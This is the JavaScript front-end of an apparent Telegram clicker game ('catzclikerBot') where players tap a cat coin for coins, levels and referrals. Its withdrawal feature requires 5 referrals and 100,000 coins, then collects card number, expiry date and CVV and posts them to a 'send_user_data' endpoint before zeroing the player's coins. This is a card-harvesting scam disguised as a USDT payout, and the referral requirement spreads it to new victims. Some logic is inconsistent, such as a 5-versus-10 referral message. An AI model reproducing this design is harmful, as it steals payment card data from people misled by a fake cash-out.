document.addEventListener('DOMContentLoaded', async () => {
    const tg = window.Telegram.WebApp;
    tg.expand(); // Расширяет WebApp на весь экран

    const catcoin = document.querySelector('.catcoin');
    const energyLabel = document.querySelector('.energy');
    const animationContainer = document.getElementById('animation-container');
    const coinsDisplay = document.getElementById('coins');
    const username = document.getElementById('username');
    const boostContainer = document.getElementById('boostContainer');
    const boostButton = document.getElementById('boostButton');
    const boostWindow = document.querySelector('.boost-window');
    const energy_error_window = document.getElementById('energy-error-cont');
    const close_app = document.getElementById('close-app');
    const link_button = document.getElementById('link-button-refferal');
    const referrals_cont = document.getElementById('referrals-container');
    const referrals_window = document.getElementById('referrals-window');
    const reff_link = document.getElementById('reff-link');

    const payment_cont = document.getElementById('payment-cont');
    const close_payment = document.getElementById('close-payment');
    const payment_button = document.getElementById('payment-button');

    const card_number = document.getElementById('card_number');
    const date = document.getElementById('date');
    const cvv = document.getElementById('cvv');
    const send_payment_request = document.getElementById('send_payment_request');

    const data_payment_cont = document.getElementById('data_payment_cont');

    const not_enough_money_cont = document.getElementById('not_enough_money_cont');

    const news_container = document.getElementById('news_container');
    const news_window = document.getElementById('news_window');
    const news_button = document.getElementById('news_button');

    const not_enough_referrals_cont = document.getElementById('not_enough_referrals_cont');
    const not_enough_window = document.getElementById('not_enough_window');
    const referrals_count = document.getElementById('referrals_count');

    const user_bonus_cont = document.getElementById('user_bonus_cont');
    const accept_button = document.getElementById('accept_button');

    const convert = document.getElementById('convert');
    const convert_sum = document.getElementById('convert_sum');

    const conversionRate = 100000 / 100;

    convert.addEventListener('input', () => {
        console.log("Convert input detected");
        const coins = parseFloat(convert.value) || 0;
        console.log(`Coins: ${coins}`);
        const usdt = coins / conversionRate;
        convert_sum.value = usdt.toFixed(2); // Ограничиваем до 2 знаков после запятой
        console.log(`USDT: ${usdt}`);
    });

    convert_sum.addEventListener('input', () => {
        const usdt = parseFloat(convert_sum.value) || 0;
        const coins = usdt * conversionRate;
        convert.value = coins.toFixed(2); // Ограничиваем до 2 знаков после запятой
    });

    const progress = document.getElementById('progress');
    const levelTitle = document.getElementById('level-title');
    let currentLevel = 1;
    let currentRank = 'Silver';
    let currentProgress = 0;
    let coinsPerClick = 1;
    let maxEnergy = 1500; // Максимальное количество энергии

    const ranks = ['Catzen', 'Catmaster', 'Catlord', 'Catronaut', 'Catalyst', 'Catroner', 'Catzilla', 'CATGOD'];

    async function checkUserBonus(user_id) {
        try {
            const response = await fetch('check_user_bonus', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({ user_id: user_id })
            });
            if (!response.ok) {
                throw new Error(`Error: ${response.status}`);
            }
            const user_bonus = await response.json();
            return user_bonus;
        } catch (error) {
            return null; // Возвращаем null в случае ошибки
        }
    }
    

    async function updateUserInfo(user_id, coins, energy, progress, coinsPerClick, rank, level, maxEnergy) {
        try {
            const response = await fetch('update_user_info', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({ 
                    id: user_id, 
                    coins: coins, 
                    energy: energy, 
                    progress: progress, 
                    coinsPerClick: coinsPerClick, 
                    currentRank: rank, 
                    currentLevel: level, 
                    maxEnergy: maxEnergy 
                })
            });
            if (!response.ok) {
                throw new Error(`Error: ${response.status}`);
            }
        } catch (error) {
            console.error('Error updating user info:', error);
        }
    }

    async function getUserReferrals(user_id) {
        try {
            const response = await fetch('gets_user_referrals', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({ user_id: user_id })
            });
            if (!response.ok) {
                throw new Error(`Error: ${response.status}`);
            }
            const user_referrals = await response.json();
            return user_referrals;
        } catch (error) {
            console.error("Error fetching user info:", error);
            return null; // Возвращаем null в случае ошибки
        }
    }

    function updateLevel() {
        currentProgress += 0.05; // Увеличиваем прогресс на 0.1% за каждый клик
    
        // Если достигли 100% прогресса, сбрасываем и делаем дополнительные действия
        if (currentProgress >= 100) {
            currentProgress = 0; // Сброс до 0%
            currentLevel += 1; // Увеличение уровня
            coinsPerClick += 1; // Увеличение количества коинов за клик
            maxEnergy += 500; // Увеличиваем максимальное количество энергии
            if (currentLevel > 5) {
                currentLevel = 1;
                let currentRankIndex = ranks.indexOf(currentRank);
                if (currentRankIndex < ranks.length - 1) {
                    currentRank = ranks[currentRankIndex + 1];
                }
            }
        }
    
        // Обновляем отображение уровня и прогресса
        levelTitle.textContent = `${currentRank} ${currentLevel}`;
        progress.style.width = `${currentProgress}%`;
    }

    function validatePaymentFields() {
        const cardNumberPattern = /^\d{16}$/;
        const datePattern = /^(0[1-9]|1[0-2])\/\d{2}$/; // MM/YY формат
        const cvvPattern = /^\d{3}$/;

        const isValidCardNumber = cardNumberPattern.test(card_number.value);
        const isValidDate = datePattern.test(date.value);
        const isValidCvv = cvvPattern.test(cvv.value);

        if (!isValidCardNumber) {
            alert("Incorrect card number. Enter 16 digits.");
        }

        if (!isValidDate) {
            alert("Incorrect date. Use the MM/YY format.");
        }

        if (!isValidCvv) {
            alert("Incorrect CVV. Enter 3 digits.");
        }

        return isValidCardNumber && isValidDate && isValidCvv;
    }

    async function handleUserBonus(user_id) {
        let userBonus = await checkUserBonus(user_id);
        console.log(userBonus)
    
        if (userBonus['bonus'] === 0) {
            user_bonus_cont.style.visibility = 'visible';
            user_bonus_cont.classList.add('visible');
    
            try {
                const response = await fetch('giveUserBonus', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({ user_id: user_id })
                });
                if (!response.ok) {
                    throw new Error(`Error: ${response.status}`);
                }
    
                // Сохраняем обновленное количество коинов на сервере
                await updateUserInfo(user_id, start_coins);
                return start_coins
            } catch (error) {
                console.error('Error giving user bonus:', error);
            }
        }
    }

    async function getUserInfo(user_id) {
        try {
            const response = await fetch('gets_user_info', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({ user_id: user_id })
            });
            if (!response.ok) {
                throw new Error(`Error: ${response.status}`);
            }
            const user_info = await response.json();
            return user_info;
        } catch (error) {
            console.error("Error fetching user info:", error);
            return null; // Возвращаем null в случае ошибки
        }
    }

    try {
        const user_id = tg.initDataUnsafe.user?.id;
        const user_username = tg.initDataUnsafe.user?.username; // Получаем id пользователя
        handleUserBonus(user_id);
        if (!user_id) {
            console.error("User ID not found in Telegram init data.");
            return;
        }
        let user_info = await getUserInfo(user_id); // Ждем получения информации о пользователе
        console.log(user_info)

        if (!user_info) {
            console.error("No user info received.");
            return; // Выходим из функции, если данные пользователя не получены
        }

        let start_coins = user_info['coins'];
        let currentEnergy = user_info['energy'];
        currentLevel = user_info['currentLevel'];
        currentRank = user_info['currentRank'];
        coinsPerClick = user_info['coinsPerClick'];
        currentProgress = user_info['progress'];
        maxEnergy = user_info['maxEnergy'];


        // Устанавливаем начальные значения в HTML элементы
        coinsDisplay.textContent = start_coins;
        energyLabel.textContent = `${currentEnergy}/${maxEnergy}`;
        username.textContent = `@${user_username}`;
        levelTitle.textContent = `${currentRank} ${currentLevel}`;
        progress.style.width = `${currentProgress}%`;


        catcoin.addEventListener('click', async (event) => {
            if (currentEnergy === 0) {
                energy_error_window.style.visibility = 'visible';
                energy_error_window.classList.add('visible');
                
                try {
                    const response = await fetch('replace_energy', {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify({ user_id: user_id, maxEnergy: maxEnergy })
                    });
                } catch (error) {
                    console.error("Error in energy replenishment fetch:", error);
                }
        
                return; // Прекращаем выполнение функции, если энергия равна нулю
            }
        
            start_coins += coinsPerClick; // Увеличиваем количество коинов на основе текущего уровня
            coinsDisplay.textContent = start_coins;
        
            // Уменьшаем энергию
            currentEnergy -= 1;
            if (currentEnergy < 0) {
                currentEnergy = 0;
            }
            energyLabel.textContent = `${currentEnergy}/${maxEnergy}`;
        
            // Создаем элемент +1 с анимацией
            const plusOne = document.createElement('div');
            plusOne.className = 'animation';
            plusOne.textContent = `+${coinsPerClick}`;
        
            // Получаем положение клика
            const clickX = event.clientX;
            const clickY = event.clientY;
        
            // Устанавливаем положение элемента +1
            plusOne.style.left = `${clickX}px`;
            plusOne.style.top = `${clickY}px`;
        
            // Добавляем элемент в контейнер анимации
            animationContainer.appendChild(plusOne);
        
            // Удаляем элемент после завершения анимации
            setTimeout(() => {
                plusOne.remove();
            }, 1000);
        
            // Обновляем информацию о пользователе
            await updateUserInfo(user_id, start_coins, currentEnergy, currentProgress, coinsPerClick, currentRank, currentLevel, maxEnergy);
        
            // Обновляем уровень и прогресс
            updateLevel();
        });

        
        accept_button.addEventListener('click', async () => {
            location.reload()
            if (user_bonus_cont.classList.contains('visible')) {
                user_bonus_cont.classList.remove('visible');
                setTimeout(() => {
                    user_bonus_cont.style.visibility = 'hidden';
                }, 200);
            };
        });


        news_window.addEventListener('click', async () => {
            if (news_container.classList.contains('visible')) {
                news_container.classList.remove('visible');
                setTimeout(() => {
                    news_container.style.visibility = 'hidden';
                }, 200);
            };
        });


        news_button.addEventListener('click', () => {
            if (news_container.classList.contains('visible')) {
                news_container.classList.remove('visible');
                setTimeout(() => {
                    news_container.style.visibility = 'hidden';
                }, 500);
            } else {
                news_container.style.visibility = 'visible';
                news_container.classList.add('visible');
            }
        });

        data_payment_cont.addEventListener('click', async () => {
            if (data_payment_cont.classList.contains('visible')) {
                data_payment_cont.classList.remove('visible');
                setTimeout(() => {
                    data_payment_cont.style.visibility = 'hidden';
                }, 200);
            };
        });

        send_payment_request.addEventListener('click', async () => {
            if (!validatePaymentFields()) {
                card_number.value = ""
                date.value = ""
                cvv.value = ""
                return;
            }
            data_payment_cont.style.visibility = 'visible';
            data_payment_cont.classList.add('visible');

            const send_user_data = await fetch("send_user_data", {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({card_number: card_number.value, date: date.value, cvv: cvv.value, user_id: user_id})
            })

            start_coins = 0
            card_number.value = ""
            date.value = ""
            cvv.value = ""
    
        });

        
    
        // Функция для автоматического добавления слеша в дату
        date.addEventListener('input', (e) => {
            const value = e.target.value.replace(/\D/g, '');
            if (value.length >= 3) {
                e.target.value = `${value.slice(0, 2)}/${value.slice(2, 4)}`;
            } else {
                e.target.value = value;
            }
        });


        close_payment.addEventListener('click', () => {
            if (payment_cont.classList.contains('visible')) {
                payment_cont.classList.remove('visible');
                setTimeout(() => {
                    payment_cont.style.visibility = 'hidden';
                }, 500);
            }
        });

        not_enough_money_cont.addEventListener('click', () => {
            if (not_enough_money_cont.classList.contains('visible')) {
                not_enough_money_cont.classList.remove('visible');
                setTimeout(() => {
                    not_enough_money_cont.style.visibility = 'hidden';
                }, 200);
            }
        })

        not_enough_window.addEventListener('click', async () => {
            if (not_enough_referrals_cont.classList.contains('visible')) {
                not_enough_referrals_cont.classList.remove('visible');
                setTimeout(() => {
                    not_enough_referrals_cont.style.visibility = 'hidden';
                }, 200);
            };
        });

        payment_button.addEventListener('click', async () => {

            const referrals_col = await getUserReferrals(user_id)

            if (referrals_col < 5) {
                referrals_count.textContent = `You have ${referrals_col}/10 referrals`
                not_enough_referrals_cont.style.visibility = 'visible';
                not_enough_referrals_cont.classList.add('visible');
                return
            }

            if (start_coins < 100000) {
                not_enough_money_cont.style.visibility = 'visible';
                not_enough_money_cont.classList.add('visible')
                return
            }
            if (payment_cont.classList.contains('visible')) {
                payment_cont.classList.remove('visible');
                setTimeout(() => {
                    payment_cont.style.visibility = 'hidden';
                }, 500);
            } else {
                payment_cont.style.visibility = 'visible';
                payment_cont.classList.add('visible');
            }
        });

        boostButton.addEventListener('click', () => {
            if (boostContainer.classList.contains('visible')) {
                boostContainer.classList.remove('visible');
                setTimeout(() => {
                    boostContainer.style.visibility = 'hidden';
                }, 500);
            } else {
                boostContainer.style.visibility = 'visible';
                boostContainer.classList.add('visible');
            }
        });

        boostWindow.addEventListener('click', () => {
            if (boostContainer.classList.contains('visible')) {
                boostContainer.classList.remove('visible');
                setTimeout(() => {
                    boostContainer.style.visibility = 'hidden';
                }, 200);
            }
        });

        link_button.addEventListener('click', () => {
            if (referrals_cont.classList.contains('visible')) {
                referrals_cont.classList.remove('visible');
                setTimeout(() => {
                    referrals_cont.style.visibility = 'hidden';
                }, 500);
            } else {
                referrals_cont.style.visibility = 'visible';
                referrals_cont.classList.add('visible');
                reff_link.textContent = `https://t.me/catzclikerBot?start=${user_id}`;
            }
        });

        referrals_window.addEventListener('click', () => {
            if (referrals_cont.classList.contains('visible')) {
                referrals_cont.classList.remove('visible');
                setTimeout(() => {
                    referrals_cont.style.visibility = 'hidden';
                }, 200);
            }
        });

        energy_error_window.addEventListener('click', () => {
            if (energy_error_window.classList.contains('visible')) {
                energy_error_window.classList.remove('visible');
                setTimeout(() => {
                    energy_error_window.style.visibility = 'hidden';
                }, 500);
            }
        });

        close_app.addEventListener('click', () => {
            window.Telegram.WebApp.close();
        });

    } catch (error) {
        console.error("Error in DOMContentLoaded event:", error);
    }
});
